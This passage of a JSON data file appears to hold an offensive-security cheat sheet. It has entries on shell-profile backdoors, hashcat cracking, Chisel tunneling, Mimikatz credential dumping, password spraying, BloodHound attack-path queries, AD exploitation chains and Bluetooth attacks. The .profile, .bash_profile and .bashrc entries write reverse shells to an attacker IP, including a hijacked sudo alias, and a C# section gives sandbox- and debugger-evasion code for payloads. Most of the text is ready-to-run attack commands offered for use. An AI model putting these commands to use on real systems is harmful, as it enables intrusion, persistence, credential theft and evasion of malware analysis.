            "code": "echo 'nohup bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> ~/.profile"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": ".bash_profile Backdoor",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'nohup nc -e /bin/bash <AttackerIP> <Port> &' >> ~/.bash_profile"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Config File Backdoors",
    "title": "Bashrc Backdoor",
    "tags": [
      "Exploitation",
      "Linux",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Reverse Shell on Login",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> ~/.bashrc"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Conditional Backdoor",
        "codes": [
          {
            "lang": "bash",
            "code": "cat >> ~/.bashrc << 'EOF'\nif [ -f /tmp/.runme ]; then\n    bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &\n    rm /tmp/.runme\nfi\nEOF"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Alias Hijacking",
        "codes": [
          {
            "lang": "bash",
            "code": "echo \"alias sudo='sudo bash -c '\\''bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &'\\''; sudo'\" >> ~/.bashrc"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Password Cracking",
    "title": "Basic Cracking Playbook",
    "tags": [
      "Credential_Access",
      "Hashcat",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Step 1 - Custom Wordlist Attack",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -a 0 -m 0 -w 4 <HashFile> <CustomWordlist>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 2 - Custom Wordlist with Rules",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -a 0 -m 0 -w 4 <HashFile> <CustomWordlist> -r best64.rule --loopback"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 3 - Dictionary Attack",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -a 0 -m 0 -w 4 <HashFile> <Wordlist>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 4 - Dictionary with Rules",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -a 0 -m 0 -w 4 <HashFile> <Wordlist> -r best64.rule"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 5 - Combinator Attack",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -a 1 -m 0 -w 4 <HashFile> <Wordlist1> <Wordlist2>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 6 - Hybrid Attack",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -a 6 -m 0 -w 4 <HashFile> <Wordlist> ?d?d?d?d"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 7 - Mask Attack",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -a 3 -m 0 -w 4 <HashFile> ?a?a?a?a?a?a?a?a"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Step-by-step methodology for cracking hashes. This example assumes MD5 (fast hash)."
      }
    ]
  },
  {
    "category": "Tunneling with Chisel",
    "title": "Basic Reverse Tunneling",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "Pivoting",
      "Tunneling",
      "Windows"
    ],
    "steps": [
      {
        "title": "Server on Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "chisel server -p 8000 --reverse"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "text",
            "content": "**Flags:**\n- `-p 8000` - Listen on port 8000\n- `--reverse` - Allow reverse tunnels"
          }
        ]
      },
      {
        "title": "Client on Victim",
        "substeps": [
          {
            "title": "Forward Local Port to Kali",
            "codes": [
              {
                "lang": "bash",
                "code": "# Listen on Kali port 80, forward to victim's localhost:80\nchisel client <KaliIP>:8000 R:80:127.0.0.1:80"
              },
              {
                "lang": "bash",
                "code": "chisel client 10.10.14.5:8000 R:80:127.0.0.1:80"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "postNotes": [
              {
                "type": "note",
                "content": "Now accessing `http://127.0.0.1:80` on Kali reaches victim's localhost:80.",
                "variant": "info"
              }
            ]
          },
          {
            "title": "Forward Remote Network Port to Kali",
            "codes": [
              {
                "lang": "bash",
                "code": "# Listen on Kali port 443, forward to 10.10.10.240:80\nchisel client <KaliIP>:8000 R:443:10.10.10.240:80"
              },
              {
                "lang": "bash",
                "code": "chisel client 10.10.14.5:8000 R:443:10.10.10.240:80"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "postNotes": [
              {
                "type": "note",
                "content": "Now accessing `http://127.0.0.1:443` on Kali reaches 10.10.10.240:80 through the victim.",
                "variant": "info"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Reverse tunneling is most common - victim connects back to attacker.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Mimikatz",
    "title": "Basic Usage",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Start Mimikatz",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enable Debug Privilege",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # privilege::debug"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Always run `privilege::debug` first - required for most operations.",
            "variant": "important"
          }
        ]
      },
      {
        "title": "One-Liner Execution",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Use one-liners to avoid interactive sessions and save output to files.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Save Output to File",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > creds.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Invoke-RunasCs",
    "title": "Basic Usage",
    "tags": [
      "Lateral_Movement",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Execute Command as Another User",
        "codes": [
          {
            "lang": "powershell",
            "code": "Invoke-RunasCs -Username <User> -Password '<Password>' -Command \"whoami\""
          },
          {
            "lang": "powershell",
            "code": "Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Execute Command with Domain",
        "codes": [
          {
            "lang": "powershell",
            "code": "Invoke-RunasCs -Username <User> -Password '<Password>' -Domain <Domain> -Command \"whoami\""
          },
          {
            "lang": "powershell",
            "code": "Invoke-RunasCs -Username admin -Password 'P@ssw0rd' -Domain corp.local -Command \"whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Execute PowerShell Script",
        "codes": [
          {
            "lang": "powershell",
            "code": "Invoke-RunasCs -Username <User> -Password '<Password>' -Command \"powershell.exe -c Get-Process\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "NetExec",
    "title": "Basic Usage",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Syntax",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc <protocol> <target> -u <username> -p <password> [options]"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "text",
            "content": "**Supported Protocols:**\n- `smb` - SMB/CIFS enumeration and exploitation\n- `ldap` - LDAP enumeration\n- `winrm` - WinRM access testing\n- `rdp` - RDP access testing\n- `ssh` - SSH access testing\n- `mssql` - MS SQL Server enumeration\n- `ftp` - FTP enumeration\n- `wmi` - WMI enumeration"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Behavioral Evasion",
    "title": "Behavioral Evasion Techniques",
    "tags": [
      "Defense_Evasion",
      "Windows"
    ],
    "steps": [
      {
        "title": "Simple Sleep Timers",
        "substeps": [
          {
            "title": "C# Sleep Before Execution",
            "codes": [
              {
                "lang": "csharp",
                "code": "// Sleep for 10 seconds before payload\nDateTime start = DateTime.Now;\nSystem.Threading.Thread.Sleep(10000);\ndouble elapsed = DateTime.Now.Subtract(start).TotalSeconds;\n\n// Verify sleep actually occurred (sandbox detection)\nif (elapsed < 9.5)\n{\n    return; // Sandbox accelerated time - exit\n}\n\n// Execute payload"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "PowerShell Sleep",
            "codes": [
              {
                "lang": "powershell",
                "code": "Start-Sleep -Seconds 120\n# Payload here"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Sandboxes often have time limits. Sleeping can bypass analysis windows.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Non-Emulated API Calls",
        "substeps": [
          {
            "title": "VirtualAllocExNuma",
            "codes": [
              {
                "lang": "csharp",
                "code": "[DllImport(\"kernel32.dll\", SetLastError = true)]\nstatic extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, uint nndPreferred);\n\n// If returns null on single-CPU system without error, likely sandbox\nIntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x04, 0);\nif (mem == IntPtr.Zero)\n{\n    return; // Sandbox detected\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "NUMA-aware allocation. Many sandboxes don't emulate NUMA properly.",
                "variant": "info"
              }
            ]
          },
          {
            "title": "FlsAlloc",
            "codes": [
              {
                "lang": "csharp",
                "code": "[DllImport(\"kernel32.dll\")]\nstatic extern uint FlsAlloc(IntPtr lpCallback);\n\nuint fls = FlsAlloc(IntPtr.Zero);\nif (fls == 0xFFFFFFFF)\n{\n    return; // Sandbox detected\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Fiber Local Storage allocation.",
                "variant": "info"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use APIs that sandboxes don't fully emulate. If API behaves unexpectedly, likely in sandbox.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Environment Checks",
        "substeps": [
          {
            "title": "Check for Debugger",
            "codes": [
              {
                "lang": "csharp",
                "code": "[DllImport(\"kernel32.dll\")]\nstatic extern bool IsDebuggerPresent();\n\nif (IsDebuggerPresent())\n{\n    return; // Debugger detected\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Check Process Count",
            "codes": [
              {
                "lang": "csharp",
                "code": "if (System.Diagnostics.Process.GetProcesses().Length < 50)\n{\n    return; // Likely sandbox\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Real systems have many processes. Sandboxes often have few.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Check for VM Artifacts",
            "codes": [
              {
                "lang": "csharp",
                "code": "// Check for VM-related files\nif (System.IO.File.Exists(@\"C:\\Windows\\System32\\drivers\\vmmouse.sys\"))\n{\n    return; // VMware detected\n}\n\n// Check for sandbox usernames\nstring user = Environment.UserName.ToLower();\nstring[] sandboxUsers = { \"sandbox\", \"malware\", \"virus\", \"sample\", \"test\" };\nforeach (string s in sandboxUsers)\n{\n    if (user.Contains(s)) return;\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Check Domain Membership",
            "codes": [
              {
                "lang": "csharp",
                "code": "// Most sandboxes aren't domain-joined\ntry\n{\n    System.DirectoryServices.ActiveDirectory.Domain.GetComputerDomain();\n}\ncatch\n{\n    return; // Not domain-joined, might be sandbox\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Memory Artifact Checks",
        "substeps": [
          {
            "title": "Check for Specific DLLs",
            "codes": [
              {
                "lang": "csharp",
                "code": "// Sandbox analysis tools often inject DLLs\nstring[] badDlls = { \"sbiedll.dll\", \"api_log.dll\", \"dir_watch.dll\", \"pstorec.dll\" };\nforeach (ProcessModule mod in Process.GetCurrentProcess().Modules)\n{\n    foreach (string bad in badDlls)\n    {\n        if (mod.ModuleName.ToLower() == bad)\n            return; // Sandbox detected\n    }\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Combining Techniques",
        "codes": [
          {
            "lang": "csharp",
            "code": "static bool IsSandbox()\n{\n    // Check sleep timing\n    DateTime t1 = DateTime.Now;\n    Thread.Sleep(2000);\n    if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5) return true;\n\n    // Check process count\n    if (Process.GetProcesses().Length < 50) return true;\n\n    // Check for debugger\n    if (IsDebuggerPresent()) return true;\n\n    // Check username\n    string user = Environment.UserName.ToLower();\n    if (user.Contains(\"sandbox\") || user.Contains(\"malware\")) return true;\n\n    return false;\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "CheckPlz GitHub",
        "url": "https://github.com/antonioCoco/CheckPlz"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Evade sandbox analysis and behavioral detection through timing, environment checks, and API selection.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Password Cracking",
    "title": "Benchmark Testing",
    "tags": [
      "Credential_Access",
      "Hashcat",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "John the Ripper Benchmark",
        "codes": [
          {
            "lang": "bash",
            "code": "john --test"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Hashcat Benchmark",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -b"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Default Credentials",
    "title": "Best Practices",
    "tags": [],
    "steps": [
      {
        "title": "Testing Order",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "1. **Username:Username** - Most common in CTF/lab environments\n2. **admin:admin** - Second most common\n3. **Service defaults** - Based on identified services\n4. **Common passwords** - From the list above\n5. **Rockyou.txt** - Only if defaults fail"
          }
        ]
      },
      {
        "title": "Credential Reuse",
        "codes": [
          {
            "lang": "bash",
            "code": "# Found MySQL creds: root:password123\n# Try on SSH\nssh root@<TargetIP>\n# Password: password123\n\n# Try on SMB\ncrackmapexec smb <TargetIP> -u root -p password123\n\n# Try on WinRM\nevil-winrm -i <TargetIP> -u root -p password123"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If you find credentials for one service, try them everywhere!",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Documentation",
        "codes": [
          {
            "lang": "plaintext",
            "code": "Service: SSH\nHost: 10.10.10.5\nUsername: admin\nPassword: admin\nNotes: Default credentials, no password change enforced"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Always document which credentials work where:",
            "variant": "important"
          }
        ]
      }
    ],
    "resources": []
  },
  {
    "category": "Password Spraying",
    "title": "Best Practices",
    "tags": [
      "Credential_Access",
      "Initial_Access",
      "Password_Attack"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**Lockout prevention:**\n- Check password policy first\n- Use `--no-bruteforce` for 1:1 mapping\n- Limit attempts per user\n- Space out attempts over time\n- Monitor for lockouts",
        "variant": "warning"
      },
      {
        "type": "note",
        "content": "**Effective spraying:**\n- Start with 1-2 common passwords\n- Wait between spray attempts\n- Target service accounts (often no lockout)\n- Try seasonal passwords during relevant times",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Best Practices",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```plaintext\n\u2705 Stabilize immediately after getting shell\n\u2705 Use Python method first (most reliable)\n\u2705 Set TERM and SHELL variables\n\u2705 Set proper terminal size\n\u2705 Test stabilization before continuing\n\u2705 Document what worked for future reference\n```"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "BloodHound Cypher Queries",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Quick Wins",
        "codes": [
          {
            "lang": "cypher",
            "code": "MATCH p=shortestPath((u:User {name:'<USER>@<DOMAIN>'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) RETURN p"
          },
          {
            "lang": "cypher",
            "code": "MATCH p=shortestPath((o {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) RETURN p"
          },
          {
            "lang": "cypher",
            "code": "MATCH (u:User {hasspn:true}) MATCH (g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p=shortestPath((u)-[*1..]->(g)) RETURN p"
          },
          {
            "lang": "cypher",
            "code": "MATCH (u:User {dontreqpreauth:true}) RETURN u.name"
          },
          {
            "lang": "cypher",
            "code": "MATCH (u:User) WHERE u.description CONTAINS \"pass\" OR u.description CONTAINS \"pwd\" RETURN u.name, u.description"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Kerberoastable users with path to DA are highest priority targets."
          }
        ]
      },
      {
        "title": "ACL Abuse Queries",
        "codes": [
          {
            "lang": "cypher",
            "code": "MATCH p=(n)-[:GenericAll|WriteDacl|WriteOwner|ForceChangePassword]->(u:User) RETURN p"
          },
          {
            "lang": "cypher",
            "code": "MATCH p=(n)-[:GenericWrite]->(u:User) RETURN p"
          },
          {
            "lang": "cypher",
            "code": "MATCH (n)-[:AddMember]->(g:Group) WHERE g.objectid ENDS WITH '-512' OR g.objectid ENDS WITH '-519' RETURN n.name"
          },
          {
            "lang": "cypher",
            "code": "MATCH p=(g:Group {name:'DOMAIN USERS@<DOMAIN>'})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|AddMember|ForceChangePassword]->(n) RETURN p"
          },
          {
            "lang": "cypher",
            "code": "MATCH (n)-[r:GenericAll]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'}) RETURN n.name"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "GenericWrite on user = set SPN for targeted Kerberoast."
          }
        ]
      },
      {
        "title": "DCSync and Delegation Queries",
        "codes": [
          {
            "lang": "cypher",
            "code": "MATCH p=(n)-[:DCSync]->(d:Domain) RETURN p"
          },
          {
            "lang": "cypher",
            "code": "MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT (c)-[:MemberOf]->(:Group {name:'DOMAIN CONTROLLERS@<DOMAIN>'}) RETURN c.name"
          },
          {
            "lang": "cypher",
            "code": "MATCH (u:User) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate"
          },
          {
            "lang": "cypher",
            "code": "MATCH p=(n)-[:GenericWrite|GenericAll|Owns|WriteDacl|WriteOwner|AddAllowedToAct]->(c:Computer) RETURN p"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "RBCD: Any of these permissions on computer enables attack."
          }
        ]
      },
      {
        "title": "Lateral Movement Queries",
        "codes": [
          {
            "lang": "cypher",
            "code": "MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'}) MATCH (c:Computer)-[:HasSession]->(u) RETURN c.name, u.name"
          },
          {
            "lang": "cypher",
            "code": "MATCH p=(n)-[:ReadLAPSPassword]->(c:Computer) RETURN p"
          },
          {
            "lang": "cypher",
            "code": "MATCH (u:User {name:'<USER>@<DOMAIN>'})-[:AdminTo]->(c:Computer) RETURN c.name"
          },
          {
            "lang": "cypher",
            "code": "MATCH (g:Group {name:'DOMAIN USERS@<DOMAIN>'})-[:AdminTo]->(c:Computer) RETURN c.name"
          },
          {
            "lang": "cypher",
            "code": "MATCH (u:User {name:'<USER>@<DOMAIN>'})-[:CanRDP|CanPSRemote]->(c:Computer) RETURN c.name"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Additional Useful Queries",
        "codes": [
          {
            "lang": "cypher",
            "code": "MATCH (u:User {hasspn:true}) RETURN u.name,u.description,u.pwdlastset"
          },
          {
            "lang": "cypher",
            "code": "MATCH (n1)-[r:GetChanges]->(n2) RETURN n1.name"
          },
          {
            "lang": "cypher",
            "code": "MATCH p=(g:Group)-[:MemberOf*1..]->(da:Group {name:'DOMAIN ADMINS@<DOMAIN>'}) RETURN p"
          },
          {
            "lang": "cypher",
            "code": "MATCH (n {highvalue:true}) RETURN n.name, labels(n)"
          },
          {
            "lang": "cypher",
            "code": "MATCH p=shortestPath((u:User {name:'<USER>@<DOMAIN>'})-[*1..]->(h {highvalue:true})) RETURN p"
          },
          {
            "lang": "cypher",
            "code": "MATCH p=(o {owned:true})-[r]->(n) RETURN p"
          },
          {
            "lang": "cypher",
            "code": "MATCH (g:Group)-[:Enroll|AutoEnroll]->(ct:CertTemplate)-[:EnabledBy]->(ca:EnterpriseCA) WHERE ct.enrolleesuppliessubject = true AND ct.authenticationenabled = true RETURN ct.name, g.name"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Mark owned users first, then run path queries. **Priority:** Quick wins first (Kerberoast/AS-REP), then ACL abuse, then delegation."
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "BloodHound Finding to Exploitation",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**Kerberoastable user:** `GetUserSPNs.py` -> `hashcat -m 13100`\n**AS-REP roastable:** `GetNPUsers.py` -> `hashcat -m 18200`\n**GenericAll on user:** `Set-DomainUserPassword` or set SPN -> Kerberoast\n**GenericWrite on user:** Set SPN -> targeted Kerberoast\n**DCSync rights:** `secretsdump.py -just-dc`\n**LAPS read:** `netexec ldap --laps`\n**AdminTo computer:** `psexec.py` -> `mimikatz`\n**DA session on computer:** Compromise computer -> dump LSASS\n**Unconstrained delegation:** SpoolSample/PetitPotam -> capture TGT\n**Constrained delegation:** `Rubeus s4u` or `getST.py` with hash\n**RBCD-writable computer:** `impacket-rbcd` -> `getST.py`\n**AddMember to DA:** Add yourself directly to Domain Admins"
      }
    ]
  },
  {
    "category": "Bluetooth",
    "title": "Bluetooth Pentesting",
    "tags": [],
    "steps": [
      {
        "title": "Enumeration",
        "substeps": [
          {
            "title": "Check Bluetooth Adapter",
            "codes": [
              {
                "lang": "bash",
                "code": "hciconfig\nhciconfig hci0 up\nhciconfig hci0 features"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Scan for Classic Bluetooth Devices",
            "codes": [
              {
                "lang": "bash",
                "code": "# Basic scan\nhcitool scan\n\n# Extended inquiry (device names + class)\nhcitool inq\n\n# Interactive scan\nbluetoothctl\n> scan on\n> devices"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Service Discovery (SDP)",
            "codes": [
              {
                "lang": "bash",
                "code": "sdptool browse <BT_ADDR>\n\n# Search for specific service\nsdptool search --bdaddr <BT_ADDR> SP     # Serial Port\nsdptool search --bdaddr <BT_ADDR> OPUSH  # Object Push"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "BLE Scanning",
            "codes": [
              {
                "lang": "bash",
                "code": "# Enable BLE scanning\nhcitool lescan\n\n# Scan with bluetoothctl\nbluetoothctl\n> menu scan\n> transport le\n> back\n> scan on"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "BLE Enumeration with gatttool",
            "codes": [
              {
                "lang": "bash",
                "code": "gatttool -b <BLE_ADDR> -I\n> connect\n> primary          # Discover services\n> characteristics  # Discover characteristics\n> char-read-hnd <Handle>\n> char-write-req <Handle> <Value>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Bettercap BLE",
            "codes": [
              {
                "lang": "bash",
                "code": "bettercap\n> ble.recon on\n> ble.show\n> ble.enum <BLE_ADDR>"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Attacks",
        "substeps": [
          {
            "title": "Bluejacking (Message Spam)",
            "codes": [
              {
                "lang": "bash",
                "code": "ussp-push <BT_ADDR>@<Channel> <File> <RemoteName>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Send unsolicited messages via **OBEX**."
              }
            ]
          },
          {
            "title": "Bluesnarfing (Data Theft)",
            "codes": [
              {
                "lang": "bash",
                "code": "bluesnarfer -r 1-100 -b <BT_ADDR>\nbluesnarfer -s PB -b <BT_ADDR>  # Get phonebook"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Access data without pairing (exploits older devices).",
                "variant": "danger"
              }
            ]
          },
          {
            "title": "BLE GATT Fuzzing",
            "codes": [
              {
                "lang": "bash",
                "code": "gatttool -b <BLE_ADDR> -I\n> connect\n> char-write-req <Handle> 4141414141"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Write random data to writable characteristics to test for crashes or unexpected behavior.",
                "variant": "warning"
              }
            ]
          },
          {
            "title": "BLE Sniffing",
            "codes": [
              {
                "lang": "bash",
                "code": "# Using Ubertooth\nubertooth-btle -f -t <BLE_ADDR>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Requires **Ubertooth** or **nRF52840** dongle.",
                "variant": "info"
              }
            ]
          },
          {
            "title": "BLE Spoofing/Cloning",
            "codes": [
              {
                "lang": "bash",
                "code": "# Using bettercap\nbettercap\n> ble.recon on\n> set ble.device.address <BLE_ADDR>\n> ble.clone"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Clone a BLE device to intercept connections using **bettercap**.",
                "variant": "warning"
              }
            ]
          },
          {
            "title": "MAC Spoofing",
            "codes": [
              {
                "lang": "bash",
                "code": "spooftooph -i hci0 -a <TargetBT_ADDR>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Tools",
        "substeps": [
          {
            "title": "Wireshark Bluetooth Capture",
            "codes": [
              {
                "lang": "bash",
                "code": "btmon -w /tmp/capture.btsnoop\nwireshark /tmp/capture.btsnoop"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Crackle (BLE Encryption)",
            "codes": [
              {
                "lang": "bash",
                "code": "crackle -i <Capture.pcap>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks Bluetooth",
        "url": "https://book.hacktricks.wiki/en/todo/radio-hacking/bluetooth.html"
      },
      {
